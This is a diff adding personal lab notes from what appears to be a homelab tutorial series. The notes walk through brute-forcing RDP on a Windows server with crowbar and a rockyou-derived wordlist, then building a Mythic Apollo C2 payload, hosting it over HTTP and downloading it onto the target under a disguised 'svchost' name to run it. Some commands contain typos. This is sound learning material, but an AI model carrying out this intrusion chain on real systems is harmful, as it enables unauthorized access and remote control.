@@ -1,0 +1,48 @@
+MYTHIC AGENT SETUP TUTORIAL DAY 21
+
+
+Create Passwords.txt in Windows server. Change password of server to whats in the file.
+
+Use Kali linux vm to create a password list (take from rockyou list). Take first 50 and add your windows PW to it - I know,
+it's cheating. THIS IS PROOF OF CONCEPT.
+
+Update my kali with sudo apt-get u  pdate && sudo apt-get upgrade -y
+
+For brute force password, we'll use crowbar. Need to install it. 
+sudo apt-get install -y crowbar
+
+INITIAL ACCESS PHASE - Use crowbar to bruteforce RDP into windows server
+
+Create a txtfile in kali - windows IP
+                           Username
+
+command
+crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s [TARGET IP]/IPRange
+
+tool, rdp service, useraccount, wordlist, -s=targetip, cidr range for just this machine. 
+
+next, we'll use xfreerdp to remote in!
+/u:Administrator /p:[PASSWORD] /v:[WINDOWSIP]:[PORT]
+
+
+
+
+WENT TO MYTHIC TO CREATE AGENT AND PAYLOAD. APOLLO AGENT FOR HTTP. 
+MADE PAYLOAD (CHOSE EVERYTHING). 
+
+
+https://144.202.12.235:7443/direct/download/95c6d5d6-02e0-4f27-b11d-61a83f8cfeee
+
+wget file above, with --certificate
+
+change name of file, place in folder
+
+python3 -m http.server 9999
+
+mythic server - ufw allow 9999
+
+back in Kali RDP, Invoke-WebRequest -Uri http://144.202.12.235:9999/svchost-DITO.exe -OutFile "C:\Users\Public\Downloads\svchost.exe\svchost-DITO.exe"
+
+go to directory and run the executable you pushed in. check task manager and netstat anob
+
+Connection not established, go to Mythic and ufw allow 80
